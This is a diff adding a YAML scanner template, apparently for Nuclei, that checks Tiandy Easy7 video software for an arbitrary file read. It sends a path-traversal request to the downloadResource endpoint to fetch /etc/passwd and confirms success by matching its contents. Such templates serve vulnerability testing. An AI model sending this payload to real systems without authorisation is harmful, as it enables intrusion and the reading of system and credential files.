@@ -1,0 +1,28 @@
+id: TiandyEasy7-downloadResource-ReadAnyFile
+
+info:
+  name: TiandyEasy7-downloadResource-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    TiandyEasy7-downloadResource-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        GET /Easy7/rest/file/downloadResource?path=/../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - root:x
+          - sbin
+        condition: and
+
+      - type: status
+        status:
+          - 200
